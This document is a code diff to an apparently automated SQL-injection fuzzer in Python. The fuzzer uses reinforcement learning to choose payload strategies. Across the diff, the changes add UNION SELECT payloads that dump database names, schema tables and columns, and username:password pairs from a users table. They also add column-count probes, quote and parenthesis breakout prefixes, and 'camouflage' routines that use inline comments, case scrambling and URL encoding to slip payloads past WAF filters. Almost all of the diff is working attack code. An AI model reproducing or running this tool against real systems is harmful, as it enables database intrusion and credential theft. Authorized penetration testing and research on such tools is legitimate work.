@@ -3,7 +3,7 @@ import re
 from core.grammar_engine import GrammarEngine
 
 class ASTMutator:
-    def __init__(self, context="GENERIC", quoteless=False, disable_strings=True):
+    def __init__(self, context="GENERIC", quoteless=False, disable_strings=True, comment_style="-- -"):
         self.sql_keywords = [
             "UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", 
             "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION",
@@ -14,6 +14,7 @@ class ASTMutator:
         self.context = context
         self.quoteless = quoteless
         self.disable_strings = disable_strings
+        self.comment_style = comment_style
         # RL: Epsilon-Greedy parameters
         self.epsilon = 0.2  # Exploration rate
         self.strategies = {
@@ -34,6 +35,8 @@ class ASTMutator:
             "scientific_notation": self._scientific_notation_bypass,
             "wide_byte": self._wide_byte_injection,
             "dios_mutation": self._dios_mutation,
+            "union_exfil": self._union_select_exfiltration,
+            "union_probe": self._union_probe,
             "advanced_blind": self._advanced_blind_probing,
             "advanced_time": self._advanced_time_probing
         }
@@ -42,6 +45,8 @@ class ASTMutator:
         # Priority Boost: MySQL Specific & Exfiltration Methods
         self.strategy_weights["dios_mutation"] = 4.0
         self.strategy_weights["upgrade_to_exfil"] = 4.0
+        self.strategy_weights["union_exfil"] = 4.0
+        self.strategy_weights["union_probe"] = 3.0
         self.strategy_weights["scientific_notation"] = 3.0
         self.strategy_weights["wide_byte"] = 2.0
         
@@ -52,7 +57,7 @@ class ASTMutator:
         
         # Point 7: Deep Actor-Critic Integration
         from core.agent_rl import RLAgent
-        self.rl_agent = RLAgent(state_dim=7, action_names=list(self.strategy_weights.keys()))
+        self.rl_agent = RLAgent(state_dim=11, action_names=list(self.strategy_weights.keys()))
         
         self.last_strategy_used = None
         self.last_payload_used = None
@@ -64,7 +69,7 @@ class ASTMutator:
         self.stealth_mode = False
         self.boredom_counter = 0 # Track how many samey successes we hit
         self.last_score = 0
-        self.current_state_vector = [1, 0, 0, 0, 1, 0, 0] # Default baseline state
+        self.current_state_vector = [1, 0, 0, 0, 1, 0, 0, 0.5, 0, 0, 0] # Default baseline state (Size 11)
         self.semantic_memory = None # Set by IslandManager
 
     def apply_hint(self, hint):
@@ -163,35 +168,9 @@ class ASTMutator:
         return mutated
 
     def _break_regex_match(self, text):
-        """Intelligently obfuscates a string segment to bypass structural Regex rules."""
-        import random
-        import re
-        new_text = text
-        choice = random.random()
-        
-        if choice < 0.3:
-            # Inline Splitting: SELECT -> SE/*!!*/LECT
-            words = re.findall(r'[A-Za-z]+', new_text)
-            for w in set(words):
-                if len(w) > 2:
-                    idx = len(w) // 2
-                    obfuscated = w[:idx] + "/*!!*/" + w[idx:]
-                    new_text = re.sub(rf'\b{re.escape(w)}\b', obfuscated, new_text, flags=re.IGNORECASE)
-        elif choice < 0.6:
-            # Space Replacement: Replaces critical whitespace bridging keywords
-            junk = ['/**/', '/*!50000', '%0a', '%09', '/*%00*/']
-            # Only replace actual spaces to keep the syntax slightly intact
-            new_text = "".join([random.choice(junk) if c == ' ' else c for c in new_text])
-        elif choice < 0.85:
-            # Version Comments: Wrap keywords in exec comments
-            words = re.findall(r'[A-Za-z]+', new_text)
-            for w in set(words):
-                new_text = re.sub(rf'\b{re.escape(w)}\b', f"/*!{random.randint(40000, 60000)}{w}*/", new_text, flags=re.IGNORECASE)
-        else:
-            # Single URL Encoding locally
-            new_text = "".join([f"%{ord(c):02x}" for c in new_text])
-            
-        return new_text
+        """Intelligently obfuscates a string segment using active camouflage."""
+        if len(text) < 2: return text
+        return self._apply_cammo(text)
 
     def get_policy_weights(self):
         """Point 5: Export experience for Federated Learning."""
@@ -413,14 +392,26 @@ class ASTMutator:
         return payload
 
     def _discover_column_count(self, payload):
-        """Probes for column count using ORDER BY / GROUP BY."""
+        """Probes for column count using ORDER BY / GROUP BY with variations."""
         clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
-        num = random.randint(1, 15)
-        techniques = [
+        num = random.randint(1, 20)
+        
+        # Variations for ORDER BY / GROUP BY
+        order_by_vars = [
             f" ORDER BY {num}",
-            f" GROUP BY {num}"
+            f" GROUP BY {num}",
+            f" ORDER/**/BY {num}",
+            f" /*!50000ORDER BY*/ {num}",
+            f" ORDER BY (SELECT {num})",
+            f" ORDER BY {num},1",
+            f" ORDER BY {num} desc"
         ]
-        return clean_payload + random.choice(techniques)
+        
+        # We can also use UNION SELECT NULL, NULL... as a probe if we are already in UNION context
+        if "UNION" in clean_payload.upper():
+             return self._balance_union_columns(clean_payload)
+             
+        return clean_payload + random.choice(order_by_vars)
 
     def _blind_exfiltration(self, payload):
         """Constructs Blind SQLi patterns for Boolean/Time-based extraction."""
@@ -487,6 +478,50 @@ class ASTMutator:
              
         # If not already a union, we start one.
         return clean_payload + " UNION SELECT " + target_pattern
+        
+    def _union_select_exfiltration(self, payload):
+        """Specifically targets data exfiltration using UNION SELECT with various data targets."""
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        
+        targets = [
+            # Basic Fingerprinting
+            "CONCAT(0x7e,DATABASE(),0x3a,USER(),0x3a,VERSION(),0x7e)",
+            # Table Enumeration
+            "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())",
+            # Column Enumeration
+            "(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name LIKE 0x257573657225)", # %user%
+            # Data Extraction
+            "(SELECT GROUP_CONCAT(username,0x3a,password) FROM users LIMIT 1)",
+            # Config extraction
+            "@@version_comment",
+            "@@datadir"
+        ]
+        
+        target = random.choice(targets)
+        
+        if "UNION" in clean_payload.upper() and "SELECT" in clean_payload.upper():
+             # Replace a NULL if present
+             if "NULL" in clean_payload.upper():
+                 return clean_payload.replace("NULL", target, 1)
+             return clean_payload + "," + target
+        
+        # Start a UNION if not present
+        return f"{clean_payload} UNION SELECT {target}"
+
+    def _union_probe(self, payload):
+        """Standard iterative UNION SELECT column discovery probe."""
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        num_cols = random.randint(1, 12)
+        cols = ["NULL"] * num_cols
+        
+        probes = [
+            f" UNION SELECT {','.join(cols)}",
+            f" UNION ALL SELECT {','.join(cols)}",
+            f" UNION SELECT {','.join(['1']*num_cols)}",
+            f" UNION SELECT {','.join([str(i) for i in range(1, num_cols+1)])}"
+        ]
+        
+        return clean_payload + random.choice(probes)
 
     def _advanced_blind_probing(self, payload):
         """Advanced Blind SQLi using MAKE_SET, LIKE, and REGEXP from reference."""
@@ -509,35 +544,103 @@ class ASTMutator:
         ]
         return clean_payload + random.choice(techniques)
 
+    def camouflage_payload(self, payload, patterns):
+        """
+        Point 5: Active Camouflage.
+        Targets identified risky patterns and wraps them in obfuscation.
+        """
+        mutated = str(payload)
+        for pattern in patterns:
+            try:
+                # Find all occurrences of the risky pattern
+                matches = list(re.finditer(pattern, mutated, re.IGNORECASE))
+                for m in reversed(matches): # Reverse to keep indices valid during replacement
+                    original = m.group(0)
+                    camouflaged = self._apply_cammo(original)
+                    # Use a regex replacement to ensure we don't break the string if indices shifted (though reversed helps)
+                    mutated = mutated[:m.start()] + camouflaged + mutated[m.end():]
+            except: pass
+        
+        # Final pass: Semantic Knowledge based obfuscation
+        if self.semantic_memory:
+            mutated = self._obfuscate_risky_parts(mutated)
+            
+        return mutated
+
+    def _obfuscate_risky_parts(self, payload):
+        """Applies camouflage specifically to tokens with bad reputation."""
+        risky_tokens = [t for t, r in self.semantic_memory.token_reputation.items() if r < 0.3]
+        mutated = str(payload)
+        for token in risky_tokens:
+            if len(token) > 2 and token.upper() in mutated.upper():
+                cammo = self._apply_cammo(token)
+                mutated = re.sub(re.escape(token), cammo, mutated, flags=re.IGNORECASE)
+        return mutated
+
+    def _apply_cammo(self, token):
+        """Applies various MySQL-specific camouflage techniques to a string segment."""
+        if len(token) < 2: return token
+        
+        techniques = []
+        # Technique 1: Inline comments
+        mid = len(token) // 2
+        techniques.append(f"{token[:mid]}/**/{token[mid:]}")
+        
+        # Technique 2: Case scrambling
+        techniques.append("".join([c.upper() if random.random() > 0.5 else c.lower() for c in token]))
+        
+        # Technique 3: Hex encoding (only for specific contexts, but here as general escape)
+        # Note: We only do this if it's not a keyword being hexed in a way that breaks syntax
+        if not re.match(r"^[a-zA-Z]+$", token): 
+             techniques.append("".join([f"%{ord(c):02x}" for c in token]))
+
+        # Technique 4: MySQL Scientific notation for numbers
+        if token.isdigit():
+            techniques.append(f"{token}.0e0")
+
+        return random.choice(techniques)
+
     def _context_aware_wrap(self, payload):
         """Wraps payload based on detected context (quotes, brackets).
            GRAMMAR-BASED FUZZING: Strictly adheres to the known insertion state to avoid syntax breaking.
            GENIUS TACTIC: Prioritize heavy terminator usage (--, #, %00) over balancing to truncate trailing SQL safely.
         """
-        terminators = ["-- -", "#", ";%00", "/*"]
+        terminators = [self.comment_style, "#", ";%00", "/*"]
         chosen_term = random.choice(terminators) if random.random() < 0.8 else ""
 
         if self.quoteless or self.disable_strings:
             # The target specifically filters/escapes quotes (e.g. ' -> / or \). 
             # We absolutely avoid sending ANY quotes.
             if self.context in ["SINGLE_QUOTE", "DOUBLE_QUOTE", "GENERIC"]:
-                 # Relying on backslash escape trick to break out of string context implicitly
-                 # Fix: Avoid backslash explosion (don't stack if already present)
                  prefix = "\\" if not payload.startswith("\\") else ""
                  return prefix + payload + chosen_term
             return payload + chosen_term
 
+        # Precision handling for identified depths (e.g., QUOTE_PAREN_2 -> ')) )
+        prefix = ""
+        if "QUOTE" in self.context:
+            prefix = "'" if "SINGLE" in self.context or "QUOTE" in self.context else "\""
+            if "DOUBLE" in self.context: prefix = "\""
+        
+        # Add parenthesis if detected
+        paren_match = re.search(r"PAREN(?:THESIS)?(?:_(\d+))?", self.context)
+        if paren_match:
+            depth = int(paren_match.group(1)) if paren_match.group(1) else 1
+            prefix += ")" * depth
+
+        if prefix:
+            # If it's a quote-based prefix, we might need a matching quote in the suffix before the comment
+            # But usually a comment truncated the rest, so we just return prefix + payload + terminator
+            return prefix + payload + chosen_term
+            
         if self.context == "NUMERIC":
             return payload + chosen_term
-            
+
+        # FALLBACKS
         if self.context == "SINGLE_QUOTE":
             return "'" + payload + chosen_term
-            
         if self.context == "DOUBLE_QUOTE":
             return '"' + payload + chosen_term
-            
-        if self.context == "SINGLE_QUOTE_PARENTHESIS":
-            return "')" + payload + chosen_term
 
         # Generic Random Fallback
         if random.random() > 0.4:
@@ -787,11 +890,36 @@ class ASTMutator:
         return mutated
 
     def _balance_union_columns(self, payload):
+        """Intelligently adds NULLs or columns to balance a UNION SELECT query."""
         if "UNION" in payload.upper() and "SELECT" in payload.upper():
-            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
-            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
+            # Common column counts to try
+            column_options = [
+                "NULL", "NULL,NULL", "NULL,NULL,NULL", "NULL,NULL,NULL,NULL",
+                "1,2", "1,2,3", "1,2,3,4",
+                "database(),user(),3,4",
+                "0,null,null,null,null,null",
+                "'a','b','c','d'"
+            ]
+            
+            # Identify the last SELECT part
+            parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
             if len(parts) >= 3:
-                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
+                # Count current columns
+                current_cols = parts[-1].split(",")
+                num_current = len(current_cols)
+                
+                # Mutation choice: append one or replace with random option
+                if random.random() < 0.6:
+                    current_cols.append("NULL")
+                    return f"{''.join(parts[:-1])}{parts[-1].strip()},{random.choice(['NULL', '1', 'database()'])}"
+                else:
+                    return f"{''.join(parts[:-1])}{random.choice(column_options)}"
+                    
+        # If no UNION is present, maybe we initiate one? 
+        # (This is usually handled by _upgrade_to_exfil, but we can nudge here)
+        if random.random() < 0.2:
+             return payload + " UNION SELECT NULL"
+             
         return payload
 
     def _junk_filling(self, payload):
